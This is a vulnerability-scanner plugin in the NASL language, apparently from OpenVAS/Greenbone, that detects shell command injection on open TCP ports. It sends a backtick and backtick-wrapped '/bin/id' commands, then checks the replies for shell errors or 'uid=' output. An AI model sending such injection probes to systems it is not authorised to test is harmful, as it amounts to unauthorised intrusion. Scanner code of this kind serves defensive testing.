if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.10879" );
	script_version( "2020-08-24T08:40:10+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 08:40:10 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_name( "Shell Command Execution Vulnerability" );
	script_category( ACT_DESTRUCTIVE_ATTACK );
	script_copyright( "Copyright (C) 2001 SecurITeam" );
	script_family( "Gain a shell remotely" );
	script_dependencies( "secpod_open_tcp_ports.sc" );
	script_mandatory_keys( "TCP/PORTS" );
	script_tag( name: "solution", value: "Make sure all meta characters are filtered out, or close the port
  for access from untrusted networks" );
	script_tag( name: "summary", value: "The remote port seems to be running some form of shell script,
  with some provided user input. The input is not stripped for such meta
  characters as `' etc. This would allow a remote attacker to execute arbitrary code." );
	script_tag( name: "solution_type", value: "Workaround" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
func test_port( port, command ){
	soc = open_sock_tcp( port );
	if(soc){
		data = NASLString( "`", command, "` #\\r\\n" );
		send( socket: soc, data: data );
		buf = recv( socket: soc, length: 65535, min: 1 );
		looking_for = NASLString( "uid=" );
		close( soc );
		if(ContainsString( buf, looking_for )){
			report = "Sent request:      " + data + "\n";
			report += "Received response: " + buf;
			security_message( port: port );
			exit( 0 );
		}
	}
}
func test_for_backtick( port ){
	soc = open_sock_tcp( port );
	if(soc){
		data = NASLString( "`\\r\\n" );
		send( socket: soc, data: data );
		buf = recv( socket: soc, length: 65535, min: 1 );
		looking_for = NASLString( "sh: unexpected EOF while looking for " );
		looking_for_2 = raw_string( 0x60, 0x60, 0x27 );
		looking_for = NASLString( looking_for, looking_for_2 );
		close( soc );
		if(ContainsString( buf, looking_for )){
			report = "Sent request:      " + data + "\n";
			report += "Received response: " + buf;
			security_message( port: port );
			exit( 0 );
		}
	}
}
port = tcp_get_all_port();
test_for_backtick( port: port );
test_port( port: port, command: "/bin/id" );
test_port( port: port, command: "/usr/bin/id" );
exit( 99 );

